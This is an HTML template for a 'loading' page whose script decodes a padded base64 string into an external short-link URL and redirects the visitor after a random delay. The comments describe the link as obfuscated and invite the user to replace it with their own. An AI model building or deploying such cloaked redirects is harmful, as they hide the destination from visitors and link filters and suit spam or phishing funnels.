<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>加载中...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <div>正在加载中，请稍等…</div>

  <script>
    // 混淆链接（前缀 + b64 + 后缀）
    const token = "keuiaHR0cHM6Ly92bGluay5jYy94eHh2dnY=kzew";  // 替换为你的加密链接
    const start = 4, end = 4;

    // 解码函数
    function go() {
      try {
        const base64 = token.slice(start, -end);
        const target = atob(base64);
        window.location.href = target;
      } catch (e) {
        console.log("异常终止：地址无效");
      }
    }

    // 随机延迟 800-1000 毫秒后跳转
    setTimeout(go, 800 + Math.random() * 201);
  </script>
</body>
</html>
